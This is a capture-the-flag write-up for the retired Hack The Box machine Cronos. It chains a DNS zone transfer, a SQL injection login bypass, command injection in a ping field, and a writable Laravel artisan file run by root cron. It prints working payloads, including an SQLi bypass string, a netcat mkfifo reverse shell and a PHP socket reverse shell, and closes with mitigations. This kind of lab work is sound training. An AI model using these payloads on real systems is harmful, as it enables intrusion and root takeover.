---
machine: Cronos
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, sqli, command-injection, cron, laravel]
---

# Cronos — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A zone transfer on port 53 reveals `admin.cronos.htb`. The admin panel falls to a trivial SQL bypass and exposes a `ping` utility with command injection: reverse shell as `www-data`. Escalation is a root cron job running `php artisan schedule:run`, and Laravel's `artisan` is writable by `www-data`.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.2p2 Ubuntu
53/tcp  dns   ISC BIND 9.10.3-P4-Ubuntu
80/tcp  http  Apache httpd 2.4.18
```

## Enumeration

```bash
dig axfr @<IP> cronos.htb
```

```text
cronos.htb.       604800 IN A <IP>
admin.cronos.htb. 604800 IN A <IP>
www.cronos.htb.   604800 IN A <IP>
```

```bash
echo "<IP> cronos.htb admin.cronos.htb www.cronos.htb" | sudo tee -a /etc/hosts
```

`admin.cronos.htb` serves a Laravel login panel. `www.cronos.htb` is the company site.

## Foothold

The login does not sanitise the query:

```text
username: admin' or 1=1-- -
password: anything
```

Inside sits a network tool that `ping`s an address. The field reaches `shell_exec` unescaped:

```text
127.0.0.1; id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell:

```bash
# on the victim, through the vulnerable field
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

```bash
nc -lvnp 4444
```

## Escalation

```bash
cat /etc/crontab; ls -l /var/www/laravel/artisan
```

```text
* * * * * root php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
-rwxrwxrwx 1 www-data www-data 1339 artisan
```

`artisan` is Laravel's entrypoint and is `777`, so it can be rewritten. Prepend a payload and let root's cron run it every minute:

```php
<?php
$sock = fsockopen("<IP>", 5555);
exec("/bin/sh -i <&3 >&3 2>&3");
```

```bash
nc -lvnp 5555
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Evidence (redacted)

```text
/var/www/html/user.txt -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- An open AXFR gives away the surface, admin subdomains included.
- Concatenating user input into system commands (`ping $ip`) is RCE; `escapeshellarg` plus validation lists fixes it.
- `777` on a framework entrypoint combined with a root cron turns a compromised web app into root within a minute.
- Mitigation: restrict `allow-transfer` to authorised secondaries, use prepared statements, and keep `artisan` at `644 root:root` with the cron calling a read-only wrapper.
